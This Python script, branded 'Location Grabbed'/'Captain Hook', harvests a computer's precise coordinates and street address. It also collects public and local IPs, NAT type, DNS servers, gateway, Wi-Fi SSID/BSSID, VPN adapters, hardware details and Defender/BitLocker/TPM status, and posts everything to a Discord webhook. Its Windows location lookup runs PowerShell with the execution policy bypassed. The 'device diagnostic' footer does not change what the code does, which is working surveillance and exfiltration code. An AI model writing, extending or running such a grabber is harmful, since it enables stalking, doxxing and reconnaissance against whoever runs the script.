from __future__ import annotations
import os, sys, json, requests, platform, subprocess, logging, socket, random, struct, re
from datetime import datetime

# ---------- Logging ----------
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# ---------- Optional deps ----------
try:
    import psutil
except Exception:
    psutil = None

# ---------- Config ----------
WEBHOOK_URL = ""
NOMINATIM_USER_AGENT = os.environ.get("NOMINATIM_USER_AGENT", "LocationFetcher/1.0 (+yourname@example.com)")

# ---------- Discord embed helpers ----------
MAX_FIELDS_PER_EMBED = 25
MAX_VALUE_CHARS = 1024
MAX_EMBED_CHARS = 5900

def _truncate(s: str, limit: int = MAX_VALUE_CHARS) -> str:
    s = s or ""
    return s if len(s) <= limit else s[: limit - 1] + "…"

def _embed_char_count(embed: dict) -> int:
    total = len(embed.get("title", "")) + len(embed.get("description", "")) + len(embed.get("footer", {}).get("text", ""))
    for f in embed.get("fields", []):
        total += len(f.get("name", "")) + len(f.get("value", ""))
    return total

def build_embeds(title: str, fields: list, image_url: str | None = None, summary: str | None = None):
    embeds = []
    page = {"title": title, "color": 3447003, "fields": []}
    if summary:
        page["description"] = _truncate(summary, 1500)

    for f in fields:
        f = dict(f)
        f["value"] = _truncate(str(f.get("value", "")), MAX_VALUE_CHARS)
        if len(page["fields"]) >= MAX_FIELDS_PER_EMBED or _embed_char_count(page) + len(f["name"]) + len(f["value"]) > MAX_EMBED_CHARS:
            embeds.append(page)
            page = {"title": f"{title} (cont.)", "color": 3447003, "fields": []}
        page["fields"].append(f)

    embeds.append(page)
    if image_url and embeds:
        embeds[0]["image"] = {"url": image_url}
    if len(embeds) > 1:
        for i, e in enumerate(embeds, 1):
            e["footer"] = {"text": f"Page {i}/{len(embeds)}"}
    return embeds

def send_discord_webhook(embeds_or_embed, error_message=None, username="Captain Hook", avatar_url=None, content=None):
    if not WEBHOOK_URL:
        logging.error("DISCORD_WEBHOOK_URL is not set.")
        print("Error: DISCORD_WEBHOOK_URL is not set.")
        return
    embeds = embeds_or_embed if isinstance(embeds_or_embed, list) else [embeds_or_embed]
    payload = {"username": username, "avatar_url": avatar_url, "embeds": embeds}
    if content:
        payload["content"] = content
    if error_message:
        payload["content"] = (payload.get("content") or "") + f"\nLocation Grabber Error: {error_message}"
    try:
        r = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        r.raise_for_status()
        print("Embed(s) sent.")
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to send embed(s): {e}")
        print(f"Failed to send embed(s) to Discord webhook: {e}")

# ---------- VPN heuristics ----------
VPN_ADAPTER_PATTERNS = [r"\btun\b", r"\btap\b", r"\bwg\d*\b", r"\butun\d*\b", r"\bzt\w*\b", r"tailscale", r"expresvpn", r"nordvpn", r"openvpn", r"wintun", r"anyconnect"]
VPN_ASN_KEYWORDS = ["vpn", "cloudflare", "digitalocean", "amazon", "aws", "google", "azure", "ovh", "hetzner", "linode", "contabo"]

def vpn_likely(net_info: dict) -> bool:
    try:
        org = (net_info.get("isp") or "").lower()
        asn = (net_info.get("asn") or "").lower()
        return any(k in org or k in asn for k in VPN_ASN_KEYWORDS)
    except Exception:
        return False

def list_suspect_adapters():
    names = []
    try:
        import psutil as _ps
        for ifname in _ps.net_if_addrs().keys():
            low = ifname.lower()
            if any(re.search(p, low) for p in VPN_ADAPTER_PATTERNS):
                names.append(ifname)
    except Exception:
        pass
    return names

# ---------- Utilities ----------
def _run_cmd(cmd, timeout=4):
    try:
        return subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=timeout, text=True).strip()
    except Exception:
        return ""

# ---------- Location ----------
def _parse_ps_coords(stdout: str):
    for line in reversed([l.strip() for l in stdout.splitlines() if l.strip()]):
        if "," in line and not line.startswith("ERROR"):
            try:
                a, b = [p.strip() for p in line.split(",", 1)]
                return float(a), float(b)
            except Exception:
                continue
    return None

def get_location_windows():
    ps = r"""$ErrorActionPreference="Stop"
try { Add-Type -AssemblyName System.Device } catch { "ERROR: ASSEMBLY_LOAD_FAILED - $($_.Exception.Message)"; exit 1 }
$w = New-Object System.Device.Location.GeoCoordinateWatcher
$w.DesiredAccuracy = [System.Device.Location.GeoPositionAccuracy]::Default
$w.Start()
$max = 150; $i = 0
while ($w.Status -ne 'Ready' -and $w.Permission -ne 'Denied' -and $i -lt $max) { Start-Sleep -Milliseconds 100; $i++ }
if ($w.Status -eq 'Ready') { $loc = $w.Position.Location; "{0},{1}" -f $loc.Latitude, $loc.Longitude }
elseif ($w.Permission -eq 'Denied') { "ERROR: PERMISSION_DENIED" }
else { "ERROR: TIMEOUT_OR_SERVICE_UNAVAILABLE - Status: $($w.Status)" }
$w.Stop(); $w.Dispose()
"""
    try:
        exe = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        cmd = [exe if os.path.exists(exe) else "powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", ps]
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=20, check=True)
        coords = _parse_ps_coords(out.stdout)
        if coords:
            return (*coords, "Windows GeoCoordinateWatcher")
        errline = next((l for l in out.stdout.splitlines() if l.startswith("ERROR:")), None)
        return None, None, (errline or "No coordinates returned")
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
        return None, None, f"PowerShell error: {e}"
    except FileNotFoundError:
        return None, None, "PowerShell not found"
    except Exception as e:
        return None, None, f"Unexpected PowerShell error: {e}"

def get_location_ip():
    try:
        r = requests.get("https://ipapi.co/json/", timeout=6)
        r.raise_for_status()
        d = r.json()
        return float(d["latitude"]), float(d["longitude"]), "IP geolocation (ipapi.co)"
    except Exception as e:
        return None, None, f"IP-based geolocation error: {e}"

def get_current_location():
    sysname = platform.system()
    if sysname == "Windows":
        lat, lon, meta = get_location_windows()
        if lat is None or lon is None:
            return get_location_ip()
        return lat, lon, meta
    elif sysname in ["Linux", "Darwin"]:
        return get_location_ip()
    else:
        return None, None, f"Unsupported OS: {sysname}"

# ---------- Reverse Geocode ----------
def get_address_from_coords(lat, lon):
    try:
        geo_resp = requests.get(
            "https://nominatim.openstreetmap.org/reverse",
            params={"lat": lat, "lon": lon, "format": "json", "zoom": 18, "addressdetails": 1},
            headers={"User-Agent": NOMINATIM_USER_AGENT, "Accept-Language": "en"},
            timeout=10
        )
        geo_resp.raise_for_status()
        data = geo_resp.json()
        return data.get("display_name", "Unknown location"), (data.get("address", {}) or {})
    except Exception as e:
        return f"Error retrieving address: {e}", {}

# ---------- Network info ----------
def get_network_info():
    try:
        r = requests.get("https://ipapi.co/json/", timeout=6)
        r.raise_for_status()
        d = r.json()
        return {
            "ip": d.get("ip"),
            "isp": d.get("org") or d.get("isp"),
            "asn": d.get("asn"),
            "city": d.get("city"),
            "region": d.get("region"),
            "country": d.get("country_name"),
            "country_code": d.get("country_code"),
            "timezone": d.get("timezone"),
        }
    except Exception:
        return {}

def get_public_ipv6():
    try:
        r = requests.get("https://api64.ipify.org?format=json", timeout=5)
        r.raise_for_status()
        return r.json().get("ip")
    except Exception:
        return None

def reverse_dns(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return None

def get_dns_servers():
    sysname = platform.system()
    try:
        if sysname == "Windows":
            # PowerShell is the most reliable
            ps = "Get-DnsClientServerAddress -AddressFamily IPv4,IPv6 | Select-Object -ExpandProperty ServerAddresses"
            exe = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
            cmd = [exe if os.path.exists(exe) else "powershell", "-NoProfile", "-NonInteractive", "-Command", ps]
            out = _run_cmd(cmd)
            servers = [ln.strip() for ln in out.splitlines() if ln.strip()]
            return servers[:8]
        else:
            # Parse resolv.conf
            servers = []
            with open("/etc/resolv.conf", "r", encoding="utf-8", errors="ignore") as f:
                for ln in f:
                    ln = ln.strip()
                    if ln.startswith("nameserver"):
                        parts = ln.split()
                        if len(parts) >= 2:
                            servers.append(parts[1])
            return servers[:8]
    except Exception:
        return []

def get_default_gateway():
    sysname = platform.system()
    try:
        if sysname == "Windows":
            ps = "Get-NetRoute -DestinationPrefix 0.0.0.0/0 | Sort-Object RouteMetric | Select-Object -First 1 -ExpandProperty NextHop"
            exe = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
            cmd = [exe if os.path.exists(exe) else "powershell", "-NoProfile", "-NonInteractive", "-Command", ps]
            out = _run_cmd(cmd)
            return out.strip() or None
        elif sysname == "Linux":
            out = _run_cmd(["ip", "route", "get", "1.1.1.1"])
            m = re.search(r"\bvia\s+([0-9a-fA-F\.:]+)\b", out)
            return m.group(1) if m else None
        else:  # macOS
            out = _run_cmd(["route", "-n", "get", "default"])
            for ln in out.splitlines():
                if ln.strip().startswith("gateway:"):
                    return ln.split(":", 1)[1].strip()
            return None
    except Exception:
        return None

# ---------- STUN / NAT ----------
def _stun_binding_request(server_host: str, server_port: int = 19302, timeout=3):
    msg_type = 0x0001; msg_len = 0; magic = 0x2112A442
    try: txid = random.randbytes(12)
    except AttributeError: txid = bytes([random.randint(0, 255) for _ in range(12)])
    pkt = struct.pack("!HHI12s", msg_type, msg_len, magic, txid)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(timeout)
    try:
        s.sendto(pkt, (server_host, server_port)); data, _ = s.recvfrom(2048)
    except Exception:
        s.close(); return None, None
    s.close()
    if len(data) < 20: return None, None
    ofs = 20; magic_bytes = struct.pack("!I", magic)
    while ofs + 4 <= len(data):
        attr_type, attr_len = struct.unpack("!HH", data[ofs:ofs+4]); ofs += 4
        val = data[ofs:ofs+attr_len]; ofs += attr_len
        if attr_len % 4 != 0: ofs += (4 - (attr_len % 4))
        if attr_type == 0x0020 and len(val) >= 8:  # XOR-MAPPED-ADDRESS
            fam = val[1]; port = struct.unpack("!H", val[2:4])[0] ^ (magic >> 16)
            if fam == 0x01:
                xaddr = bytes([val[4+i] ^ magic_bytes[i] for i in range(4)])
                ip = ".".join(map(str, xaddr)); return ip, port
        elif attr_type == 0x0001 and len(val) >= 8:
            fam = val[1]; port = struct.unpack("!H", val[2:4])[0]
            if fam == 0x01:
                ip = ".".join(map(str, val[4:8])); return ip, port
    return None, None

def get_nat_info():
    servers = [("stun.l.google.com", 19302), ("stun1.l.google.com", 19302)]
    results = []
    for host, port in servers:
        ip, prt = _stun_binding_request(host, port)
        if ip and prt:
            results.append((ip, prt))
    if not results:
        return {}
    public_ip = results[0][0]
    ports = {p for _, p in results}
    nat_type = "Symmetric NAT (likely)" if len(ports) > 1 else "Cone NAT (likely)"
    return {"public_ip": public_ip, "public_ports": sorted(list(ports)), "nat_type": nat_type}

# ---------- Wi-Fi / Battery / Local IPs ----------
def get_wifi_info():
    system = platform.system()
    if system == "Windows":
        out = _run_cmd(["netsh", "wlan", "show", "interfaces"], timeout=4)
        ssid = signal = bssid = channel = None
        for ln in out.splitlines():
            line = ln.strip()
            low = line.lower()
            if low.startswith("ssid"): ssid = line.split(":",1)[1].strip()
            elif low.startswith("signal"): signal = line.split(":",1)[1].strip()
            elif low.startswith("bssid"): bssid = line.split(":",1)[1].strip()
            elif low.startswith("channel"): channel = line.split(":",1)[1].strip()
        return {"ssid": ssid or "Unknown", "signal": signal or "Unknown", "bssid": bssid or "Unknown", "channel": channel or "Unknown"} if out else {}
    elif system == "Darwin":
        airport = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
        out = _run_cmd([airport, "-I"], timeout=4) or _run_cmd(["networksetup", "-getairportnetwork", "en0"], timeout=4)
        ssid = rssi = bssid = channel = None
        for ln in out.splitlines():
            l = ln.strip().lower()
            if l.startswith("ssid:"): ssid = ln.split(":",1)[1].strip()
            if "agrctlrssi:" in l or l.startswith("rssi:"): rssi = ln.split(":",1)[1].strip()
            if l.startswith("bssid:"): bssid = ln.split(":",1)[1].strip()
            if l.startswith("channel:"): channel = ln.split(":",1)[1].strip()
        return {"ssid": ssid or "Unknown", "signal": rssi or "Unknown", "bssid": bssid or "Unknown", "channel": channel or "Unknown"} if out else {}
    else:  # Linux
        ssid = _run_cmd(["iwgetid", "-r"], timeout=3)
        bssid = _run_cmd(["iwgetid", "-a", "-r"], timeout=3)
        chan_out = _run_cmd(["iwlist", "channel"], timeout=3) or _run_cmd(["iw", "dev"], timeout=3)
        channel = "Unknown"
        m = re.search(r"current channel\s*(\d+)", chan_out, flags=re.I) or re.search(r"channel\s*(\d+)", chan_out, flags=re.I)
        if m: channel = m.group(1)
        if not ssid:
            out = _run_cmd(["nmcli", "-t", "-f", "active,ssid,signal,bssid", "dev", "wifi"], timeout=4)
            act = next((ln for ln in out.splitlines() if ln.startswith("yes:")), "")
            if act:
                parts = act.split(":"); ssid = parts[1] if len(parts) > 1 else ssid
                signal = parts[2] + "%" if len(parts) > 2 else "Unknown"
                bssid = parts[3] if len(parts) > 3 else bssid
                return {"ssid": ssid or "Unknown", "signal": signal, "bssid": bssid or "Unknown", "channel": channel}
            return {}
        iwc = _run_cmd(["iwconfig"], timeout=3).lower()
        sig = None
        for ln in iwc.splitlines():
            if "signal level" in ln or "link quality" in ln: sig = ln.strip(); break
        return {"ssid": ssid, "signal": sig or "Unknown", "bssid": bssid or "Unknown", "channel": channel}

def get_battery_info():
    if not psutil: return {}
    try:
        b = psutil.sensors_battery()
        if b is None: return {}
        secs = b.secsleft
        if secs and secs > 0: left = f"{secs//3600}h {(secs%3600)//60}m"
        elif secs == psutil.POWER_TIME_UNLIMITED: left = "Unlimited"
        else: left = "Unknown"
        return {"percent": f"{int(b.percent)}%", "plugged": "Yes" if b.power_plugged else "No", "time_left": left}
    except Exception:
        return {}

def get_local_ips():
    addrs = []
    if psutil:
        try:
            for ifname, infos in psutil.net_if_addrs().items():
                for info in infos:
                    if info.family == socket.AF_INET:
                        addrs.append(f"{ifname}: {info.address}")
        except Exception:
            pass
    if not addrs:
        try: addrs.append(f"primary: {socket.gethostbyname(socket.gethostname())}")
        except Exception: pass
    return addrs

def get_system_stats():
    # CPU / RAM / Disk / Uptime
    cpu_model = platform.processor() or "Unknown"
    cpu_cores = os.cpu_count() or 0
    mem = psutil.virtual_memory().total if psutil else None
    disk = psutil.disk_usage("/") if psutil else None
    uptime = None
    if psutil:
        boot = datetime.utcfromtimestamp(psutil.boot_time())
        uptime = datetime.utcnow() - boot
    return {
        "cpu_model": cpu_model,
        "cpu_cores": cpu_cores,
        "ram_gb": f"{round(mem/ (1024**3),1)}" if mem else "Unknown",
        "disk_used_gb": f"{round(disk.used/(1024**3),1)}" if disk else "Unknown",
        "disk_total_gb": f"{round(disk.total/(1024**3),1)}" if disk else "Unknown",
        "uptime": str(uptime).split(".")[0] if uptime else "Unknown"
    }

# ---------- Static map ----------
def get_static_map_image_url(lat, lon, zoom=15, w=800, h=400, marker=True):
    base = "https://staticmap.openstreetmap.de/staticmap.php"
    params = f"center={lat},{lon}&zoom={zoom}&size={w}x{h}"
    if marker: params += f"&markers={lat},{lon},red-pushpin"
    return f"{base}?{params}"

# ---------- Embed section helpers (add these near your other helpers) ----------
def add_fields_from_pairs(pairs: list[tuple[str, str]], inline=True) -> list[dict]:
    """pairs = [(name, value), ...] -> discord fields (skips empty)"""
    out = []
    for name, val in pairs:
        if val is None or (isinstance(val, str) and not val.strip()):
            continue
        out.append({"name": name, "value": str(val), "inline": inline})
    return out

def make_section_embed(title: str, pairs_inline: list[tuple[str, str]] | None = None,
                       blocks: list[tuple[str, str]] | None = None,
                       color: int = 0x3498DB, thumbnail_url: str | None = None,
                       summary: str | None = None, page_hint: str | None = None) -> dict:
    """
    One section = one embed. You can pass:
      - pairs_inline: compact grid fields
      - blocks: big code blocks [(name, text), ...]
    It auto-truncates via build_embeds downstream if needed.
    """
    title_final = f"{title} • {page_hint}" if page_hint else title
    e = {"title": title_final, "color": color, "fields": []}
    if summary:
        e["description"] = _truncate(summary, 1500)
    if pairs_inline:
        e["fields"].extend(add_fields_from_pairs(pairs_inline, inline=True))
    if blocks:
        for name, text in blocks:
            e["fields"].append({
                "name": name,
                "value": "```\n" + _truncate(text, MAX_VALUE_CHARS - 10) + "\n```",
                "inline": False
            })
    if thumbnail_url:
        e["thumbnail"] = {"url": thumbnail_url}
    return e

def build_password_help_embed():
    """Optional info card you toggle with SHOW_PASSWORD_HELP=1"""
    fields = [
        {
            "name": "Chrome / Edge / Brave",
            "value": (
                "Settings → **Autofill** → **Password Manager** → **⋯** → **Export passwords** → "
                "confirm with OS login.\n"
                "Then import the CSV into your password manager."
            ),
            "inline": False
        },
        {
            "name": "Firefox",
            "value": (
                "Settings → **Privacy & Security** → **Saved Logins** → **⋯** → **Export Logins** → "
                "confirm with OS login."
            ),
            "inline": False
        },
        {
            "name": "Safari (macOS)",
            "value": (
                "Safari → **Settings** → **Passwords** → **⋯** → **Export All Passwords** → "
                "authenticate with Touch ID / password."
            ),
            "inline": False
        },
        {
            "name": "Security Tips",
            "value": (
                "• The export is a **plain CSV** — keep it offline, delete it ASAP.\n"
                "• Prefer importing into an encrypted manager (e.g., Bitwarden, 1Password).\n"
                "• Never send credential exports over chat/webhooks or store them in repos."
            ),
            "inline": False
        }
    ]
    return {"title": "🔐 How to export your own browser passwords (safely)", "color": 0xFFCC00, "fields": fields}


def get_windows_security_info() -> dict:
    """
    Returns Windows security bits as a dict:
    {
      'bitlocker': [{'mount': 'C:', 'status': 'FullyEncrypted', 'protection': 'On', 'method': 'XtsAes256'}, ...],
      'defender':  {'AMServiceEnabled': True, 'RealTimeProtectionEnabled': True, 'AntivirusSignatureVersion': '...'},
      'tpm':       {'Present': True, 'Ready': True, 'Enabled': True, 'Activated': True},
      'secure_boot': True/False/None
    }
    """
    if platform.system() != "Windows":
        return {}
    ps_script = r"""
$ErrorActionPreference = "SilentlyContinue"

# BitLocker (if available)
$bl = $null
if (Get-Command Get-BitLockerVolume -ErrorAction Ignore) {
  $bl = Get-BitLockerVolume | Select-Object MountPoint, VolumeStatus, ProtectionStatus, EncryptionMethod
}

# Defender (if available)
$def = $null
if (Get-Command Get-MpComputerStatus -ErrorAction Ignore) {
  $def = Get-MpComputerStatus | Select-Object AMServiceEnabled, AntispywareEnabled, RealTimeProtectionEnabled, AntivirusSignatureVersion
}

# TPM (if available)
$tpm = $null
if (Get-Command Get-Tpm -ErrorAction Ignore) {
  $tpm = Get-Tpm | Select-Object TpmPresent, TpmReady, TpmEnabled, TpmActivated
}

# Secure Boot (may require UEFI / admin; swallow errors)
$sb = $null
try { $sb = Confirm-SecureBootUEFI } catch { $sb = $null }

[PSCustomObject]@{
  BitLocker  = $bl
  Defender   = $def
  TPM        = $tpm
  SecureBoot = $sb
} | ConvertTo-Json -Depth 6
"""
    try:
        exe = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        cmd = [exe if os.path.exists(exe) else "powershell",
               "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
               "-Command", ps_script]
        raw = _run_cmd(cmd, timeout=8)
        if not raw:
            return {}
        data = json.loads(raw)
    except Exception:
        return {}

    out: dict = {}

    # BitLocker can be object or list depending on volume count
    bl = data.get("BitLocker")
    if isinstance(bl, dict):
        bl = [bl]
    if isinstance(bl, list):
        out["bitlocker"] = [{
            "mount": v.get("MountPoint"),
            "status": v.get("VolumeStatus"),
            "protection": v.get("ProtectionStatus"),
            "method": v.get("EncryptionMethod")
        } for v in bl]

    d = data.get("Defender") or {}
    if isinstance(d, dict):
        out["defender"] = {
            "AMServiceEnabled": d.get("AMServiceEnabled"),
            "RealTimeProtectionEnabled": d.get("RealTimeProtectionEnabled"),
            "AntispywareEnabled": d.get("AntispywareEnabled"),
            "AntivirusSignatureVersion": d.get("AntivirusSignatureVersion"),
        }

    t = data.get("TPM") or {}
    if isinstance(t, dict):
        out["tpm"] = {
            "Present": t.get("TpmPresent"),
            "Ready": t.get("TpmReady"),
            "Enabled": t.get("TpmEnabled"),
            "Activated": t.get("TpmActivated"),
        }

    out["secure_boot"] = data.get("SecureBoot")
    return out

# ---------- Main ----------
def main():
    # 1) Coordinates
    lat, lon, src = get_current_location()
    if lat is None or lon is None:
        error_detail = src
        send_discord_webhook({"title": "❌ Location Retrieval Failed", "description": f"Reason: ```{error_detail}```", "color": 15548997}, error_message=error_detail)
        sys.exit(1)

    # 2) Reverse geocode
    address_display, addr = get_address_from_coords(lat, lon)
    city = addr.get("city") or addr.get("town") or addr.get("village") or addr.get("suburb") or "Unknown"
    postcode = addr.get("postcode", "Unknown")
    country = addr.get("country", "Unknown")
    cc = (addr.get("country_code") or "").upper()

    # 3) Network/IP
    net = get_network_info()
    ip = net.get("ip", "Unknown")
    isp = net.get("isp", "Unknown")
    asn = net.get("asn", "Unknown")
    tz = net.get("timezone", "Unknown")
    ip6 = get_public_ipv6()
    rdns = reverse_dns(ip) if ip and ip != "Unknown" else None
    dns_servers = get_dns_servers()
    gateway = get_default_gateway()

    # 3b) NAT via STUN
    nat = get_nat_info()
    public_ip_stun = nat.get("public_ip")
    public_ports = nat.get("public_ports")
    nat_type = nat.get("nat_type")

    # 3c) Optional external port reachability
    port_results = []  # requires your own checker service; see check_external_ports()

    # 4) System
    os_str = platform.platform()
    host = platform.node() or socket.gethostname()
    py_ver = platform.python_version()
    sysstats = get_system_stats()
    # 4b) Windows security bits
    sec = get_windows_security_info() if platform.system() == "Windows" else {}

    # 5) WiFi / Battery / Local IPs
    wifi = get_wifi_info()
    battery = get_battery_info()
    local_ips = get_local_ips()

    # Links
    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    osm_link  = f"https://www.openstreetmap.org/?mlat={lat}&mlon={lon}#map=17/{lat}/{lon}"
    static_map_url = get_static_map_image_url(lat, lon)

    # Base fields
    # ---------- Layout: rich, multi-embed ----------
    # Links / images
    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    osm_link  = f"https://www.openstreetmap.org/?mlat={lat}&mlon={lon}#map=17/{lat}/{lon}"
    static_map_url = get_static_map_image_url(lat, lon)

    # Small helpers
    def yesno(v): return "Yes" if v else "No"
    sys_arch = platform.machine() or "Unknown"

    # Try to get GPU (Windows only)
    gpu_name = None
    if platform.system() == "Windows":
        try:
            ps = "Get-CimInstance Win32_VideoController | Select-Object -First 1 -ExpandProperty Name"
            exe = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
            cmd = [exe if os.path.exists(exe) else "powershell", "-NoProfile", "-NonInteractive", "-Command", ps]
            gpu_name = _run_cmd(cmd, timeout=4)
        except Exception:
            pass

    # Summaries for the top card
    summary = (
        f"**{city}** • {country} ({cc})\n"
        f"IP: {ip} | ISP: {isp} | TZ: {tz}\n"
        f"Source: {src}"
    )

    # --- Embed A: SUMMARY (big header with map banner & thumbnail) ---
    summary_pairs = [
        ("Coordinates", f"```{lat:.6f}, {lon:.6f}``` [Google Maps]({maps_link}) • [OpenStreetMap]({osm_link})"),
        ("Approx. Address", f"```{address_display}```"),
        ("City", city), ("Postcode", postcode), ("Country", f"{country} ({cc})" if cc else country),
        ("Timezone", tz), ("Source", src),
    ]
    emb_summary = make_section_embed(
        title="📍 Location Grabbed",
        pairs_inline=[(n, v) for n, v in summary_pairs],
        color=0x2ECC71,  # greenish
        summary=summary,
    )
    # Put big image on the very first embed; small thumbnail as well
    emb_summary["image"] = {"url": static_map_url}
    emb_summary["thumbnail"] = {"url": "https://cdn-icons-png.flaticon.com/512/854/854878.png"}  # pin icon (optional)
    emb_summary["timestamp"] = datetime.utcnow().isoformat()

    # --- Embed B: NETWORK ---
    ip6 = get_public_ipv6()
    rdns = reverse_dns(ip) if ip and ip != "Unknown" else None
    dns_servers = get_dns_servers()
    gateway = get_default_gateway()

    net_pairs = [
        ("IPv4", ip), ("IPv6", ip6 or "Unknown/none"), ("rDNS", rdns or "Unknown"),
        ("ISP", isp), ("ASN", asn), ("Timezone", tz),
        ("Default Gateway", gateway or "Unknown"),
        ("DNS Servers", ", ".join(dns_servers[:5]) if dns_servers else "Unknown"),
    ]
    # NAT section
    if nat.get("public_ip"):
        net_pairs.extend([("Public IP (STUN)", nat["public_ip"]), ("NAT Type", nat.get("nat_type", "Unknown"))])

    emb_net = make_section_embed(
        title="🌐 Network",
        pairs_inline=net_pairs,
        color=0x3498DB,
        page_hint="Connectivity"
    )

    # Optional external ports block
    if port_results:
        pretty = "\n".join(f"{r['port']}: {'open ✅' if r['open'] else 'closed ❌'}" for r in port_results[:24])
        emb_net["fields"].append({"name": "External Port Check", "value": "```\n"+pretty+"\n```", "inline": False})

    # --- Embed C: WIRELESS / VPN ---
    wifi_text = ""
    if wifi:
        wifi_text = "\n".join([
            f"SSID   : {wifi.get('ssid','?')}",
            f"Signal : {wifi.get('signal','?')}",
            f"BSSID  : {wifi.get('bssid','?')}",
            f"Channel: {wifi.get('channel','?')}",
        ])
    vpn_adapters = list_suspect_adapters()
    vpn_flag = vpn_likely(net) or bool(vpn_adapters)
    wifi_pairs = []
    wifi_blocks = []
    if wifi_text:
        wifi_blocks.append(("Wi-Fi Details", wifi_text))
    if vpn_flag:
        wifi_blocks.append(("Privacy Notice", "Results appear VPN/proxy-affected."))
        if vpn_adapters:
            wifi_blocks.append(("Suspect Adapters", "\n".join(vpn_adapters[:20]) + ("\n…" if len(vpn_adapters) > 20 else "")))
        wifi_blocks.append(("Improve Accuracy", "Use a browser location prompt (GPS/Wi-Fi) or temporarily disable/split-tunnel the VPN."))

    emb_wifi = make_section_embed(
        title="📶 Wireless & Privacy",
        pairs_inline=wifi_pairs,
        blocks=wifi_blocks or [("Wi-Fi Details", "No Wi-Fi info available")],
        color=0x9B59B6,
        page_hint="Wi-Fi / VPN"
    )

    # --- Embed D: SYSTEM ---
    sysstats = get_system_stats()
    sys_pairs = [
        ("OS / Host", f"{platform.platform()}\n{host}"),
        ("Architecture", sys_arch),
        ("Python", platform.python_version()),
        ("CPU", f"{sysstats['cpu_model']} • {sysstats['cpu_cores']} cores"),
        ("RAM", f"{sysstats['ram_gb']} GB"),
        ("Disk", f"{sysstats['disk_used_gb']}/{sysstats['disk_total_gb']} GB used"),
        ("Uptime", sysstats["uptime"]),
    ]
    if gpu_name:
        sys_pairs.append(("GPU", gpu_name))

    emb_sys = make_section_embed(
        title="🖥️ System",
        pairs_inline=sys_pairs,
        color=0xE67E22,
        page_hint="Host"
    )
        # --- Embed SEC: SECURITY (Windows) ---
    def yn(x):  # pretty Yes/No/Unknown
        return "Yes" if x is True else ("No" if x is False else "Unknown")

    # BitLocker volumes as a neat block
    bl_lines = []
    for v in sec.get("bitlocker", []) or []:
        bl_lines.append(
            f"{v.get('mount') or '?'}: {v.get('status') or '?'} | "
            f"Prot: {v.get('protection') or '?'} | {v.get('method') or '?'}"
        )
    if not bl_lines:
        bl_lines = ["No data / not available"]

    sec_pairs = [
        ("Secure Boot", yn(sec.get("secure_boot"))),
    ]

    tpm = sec.get("tpm") or {}
    if tpm:
        sec_pairs.append(
            ("TPM",
             f"Present:{yn(tpm.get('Present'))}  Ready:{yn(tpm.get('Ready'))}  "
             f"Enabled:{yn(tpm.get('Enabled'))}  Activated:{yn(tpm.get('Activated'))}")
        )

    defender = sec.get("defender") or {}
    if defender:
        sec_pairs.extend([
            ("Defender Service", yn(defender.get("AMServiceEnabled"))),
            ("Real-time Protection", yn(defender.get("RealTimeProtectionEnabled"))),
            ("Signature Version", defender.get("AntivirusSignatureVersion") or "Unknown"),
        ])

    emb_sec = make_section_embed(
        title="🛡️ Security (Windows)",
        pairs_inline=sec_pairs,
        blocks=[("BitLocker Volumes", "\n".join(bl_lines))],
        color=0x2C3E50,
        page_hint="BitLocker / Defender / TPM"
    )


    # --- Embed E: INTERFACES / LOCAL IPs ---
    local_ips = get_local_ips()
    iface_block = "\n".join(local_ips[:64]) + ("\n…" if len(local_ips) > 64 else "")
    emb_if = make_section_embed(
        title="🔌 Interfaces",
        blocks=[("Local IPs", iface_block or "None")],
        color=0x95A5A6,
        page_hint="Adapters"
    )

    # Add footer + timestamp on every embed
    now_iso = datetime.utcnow().isoformat()
    for e in (emb_summary, emb_net, emb_wifi, emb_sys, emb_sec, emb_if):
        e["footer"] = {"text": "Captain Hook • device diagnostic"}
        e["timestamp"] = now_iso

    # Build paginated embeds respecting limits (and keep the hero image on the first one)
    # We pass them through build_embeds individually to enforce per-embed limits, then concatenate.
    final_embeds = []
    for e in (emb_summary, emb_net, emb_wifi, emb_sys, emb_sec, emb_if):
        # build_embeds returns a list (it will split if a single section overflows)
        split = build_embeds(e["title"], e.get("fields", []), image_url=e.get("image", {}).get("url"), summary=e.get("description"))
        # rebuild small bits (footer/timestamp/thumbnail) lost by build_embeds
        if split:
            # only first of split keeps image/thumbnail
            if "thumbnail" in e:
                split[0]["thumbnail"] = e["thumbnail"]
            for i, se in enumerate(split, 1):
                se["color"] = e.get("color", 0x3498DB)
                se["footer"] = e.get("footer")
                se["timestamp"] = e.get("timestamp")
                # add page hint if this section had multiple pages
                if len(split) > 1:
                    se["title"] = f"{e['title']} (part {i}/{len(split)})"
            final_embeds.extend(split)

    # Top-level content (nice big link)
    top_content = f"[Open in Google Maps]({maps_link})"

    # Optional “how to export passwords safely” card (off by default)
    if os.environ.get("SHOW_PASSWORD_HELP") == "1":
        send_discord_webhook(build_password_help_embed())

    # Fire!
    send_discord_webhook(final_embeds, content=top_content)

if __name__ == "__main__":
    if not WEBHOOK_URL:
        print("Error: DISCORD_WEBHOOK_URL is not set.")
    try:
        main()
    except Exception as e:
        import traceback, tempfile, pathlib
        log = pathlib.Path(tempfile.gettempdir()) / "LocationGrab.log"
        log.write_text(traceback.format_exc(), encoding="utf-8")
        # For console builds, also show it:
        print(f"Fatal error. See log: {log}")
